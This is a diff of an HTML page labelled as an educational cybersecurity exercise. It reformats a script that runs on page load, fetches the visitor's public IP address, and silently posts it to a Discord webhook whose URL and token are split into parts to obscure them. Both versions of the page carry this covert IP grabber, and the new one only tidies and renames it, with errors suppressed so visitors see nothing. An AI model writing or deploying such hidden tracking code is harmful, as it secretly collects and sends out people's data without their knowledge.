@@ -1,31 +1,62 @@
-<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Educational Resource</title> <style> body { font-family: Arial, sans-serif; text-align: center; padding: 50px; } h1 { color: #333; } </style> </head> <body> <h1>Welcome to the Learning Portal</h1> <p>This page is part of an educational cybersecurity exercise.</p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Educational Resource</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to the Learning Portal</h1>
+    <p>This page is part of an educational cybersecurity exercise.</p>
 
+    <script>
+        (function () {
+            var protocol = "https://";
+            var ipApi = "api.ipify.org";
+            var format = "?format=json";
+            var ipUrl = protocol + ipApi + format;
 
-<script>
-    (function() {
-        var a = "https://";
-        var b = "api.ipify.org";
-        var c = "?format=json";
-        var d = a + b + c;
-        
-        fetch(d).then(function(e) {
-            return e.json();
-        }).then(function(f) {
-            var g = f.ip;
-            
-            // Obfuscated Discord webhook URL (split into parts)
-            var h = "discord.com";
-            var i = "/api/webhooks/";
-            var j = "1409357759924928622"; // Replace with your webhook ID
-            var k = "/CofKLngqjohgKVxnsZWTX5ERSDfLrB5-mdxO7q_yEZPuEeSqYHOJdA8TaDVlTtjoi-Za";
-            var l = a + h + i + j + k;
-            
-            fetch(l, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: "Visitor IP: " + g })
-            }).catch(function(m) {});
-        }).catch(function(n) {});
-    })();
-</script>
-</body> </html>
+            fetch(ipUrl)
+                .then(function (response) {
+                    return response.json();
+                })
+                .then(function (data) {
+                    var visitorIp = data.ip;
+
+                    // Obfuscated Discord webhook URL (split into parts)
+                    var webhookHost = "discord.com";
+                    var webhookPath = "/api/webhooks/";
+                    var webhookId = "1409357759924928622"; // Replace with your webhook ID
+                    var webhookToken = "/CofKLngqjohgKVxnsZWTX5ERSDfLrB5-mdxO7q_yEZPuEeSqYHOJdA8TaDVlTtjoi-Za";
+                    var webhookUrl = protocol + webhookHost + webhookPath + webhookId + webhookToken;
+
+                    // Send the visitor IP to the Discord webhook
+                    fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            content: "Visitor IP: " + visitorIp
+                        })
+                    }).catch(function (err) {
+                        // Handle webhook send error silently
+                    });
+                })
+                .catch(function (err) {
+                    // Handle IP fetch error silently
+                });
+        })();
+    </script>
+</body>
+</html>
